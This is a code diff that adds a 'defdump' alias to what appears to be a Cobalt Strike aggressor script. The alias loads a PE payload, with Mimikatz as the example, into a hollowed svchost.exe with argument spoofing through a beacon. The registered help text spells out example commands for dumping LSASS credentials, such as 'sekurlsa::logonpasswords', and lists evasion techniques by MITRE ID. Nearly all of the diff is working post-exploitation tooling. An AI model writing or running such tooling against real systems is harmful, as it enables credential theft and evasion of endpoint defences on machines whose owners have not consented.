@@ -3006,3 +3006,53 @@ beacon_command_register(
     "Use 'help <command>' for full syntax and MITRE details on any BOF.\n\n" .
     "Args: none"
 );
+
+# --- defdump (BOFKatz port) ---
+alias defdump {
+    local('$bid $pe_path $args $handle $pe_data $packed');
+    $bid     = $1;
+    $pe_path = $2;
+    if ($pe_path is $null) {
+        berror($bid, "Use: defdump <pe_payload_path> [mimikatz_args...]\nExample: defdump C:\\Temp\\mz.bin sekurlsa::logonpasswords");
+        return;
+    }
+    if (!-exists $pe_path) {
+        berror($bid, "defdump: file not found: " . $pe_path);
+        return;
+    }
+    $handle = openf($pe_path);
+    $pe_data = readb($handle, -1);
+    closef($handle);
+    if ($pe_data is $null || strlen($pe_data) == 0) {
+        berror($bid, "defdump: failed to read PE payload");
+        return;
+    }
+    # Collect remaining args as mimikatz command string
+    $args = "";
+    for ($i = 3; $i < size(@_); $i++) {
+        if (strlen($args) > 0) { $args = $args . " "; }
+        $args = $args . @_[$i];
+    }
+    if (strlen($args) == 0) {
+        $args = "coffee exit";
+    } else {
+        $args = $args . " exit";
+    }
+    $packed = bof_pack($bid, "bz", $pe_data, $args);
+    dani_run($bid, "bofkatz", $packed);
+}
+beacon_command_register(
+    "defdump",
+    "Process Hollowing PE loader with argument spoofing — T1055.012 (by Dani)",
+    "Synopsis: defdump <pe_payload_path> [mimikatz_args...]\n\n" .
+    "Description: Load a PE binary via Process Hollowing into a suspended\n" .
+    "svchost.exe with command-line argument spoofing. The PE payload is\n" .
+    "read from the operator's local disk and sent to the beacon at runtime\n" .
+    "(not embedded in the BOF). Output is captured via pipes.\n\n" .
+    "Examples:\n" .
+    "  defdump C:\\Temp\\mz.bin\n" .
+    "  defdump C:\\Temp\\mz.bin sekurlsa::logonpasswords\n" .
+    "  defdump C:\\Temp\\mz.bin token::elevate privilege::debug sekurlsa::logonpasswords\n\n" .
+    "MITRE ATT&CK: T1055.012 (Process Hollowing), T1003.001 (LSASS), T1564.010 (Arg Spoofing)\n\n" .
+    "Phase: Remote Ops\nArgs: <pe_path> (required) [commands...] (optional)"
+);
